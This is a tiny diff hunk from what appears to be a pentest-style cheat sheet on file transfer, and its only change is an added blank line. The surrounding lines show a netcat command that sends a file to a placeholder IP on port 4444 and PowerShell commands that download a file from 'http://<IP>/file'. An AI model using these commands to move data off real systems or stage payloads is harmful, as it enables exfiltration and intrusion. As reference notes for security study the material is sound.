@@ -69,6 +69,7 @@ nc <IP> 4444 < file
 ```bash
 # Download File:
 Invoke-WebRequest -Uri http://<IP>/file -OutFile file
+
 (New-Object Net.WebClient).DownloadFile("http://<IP>/file", "file")
 
 # Base64 Encode/Decode:
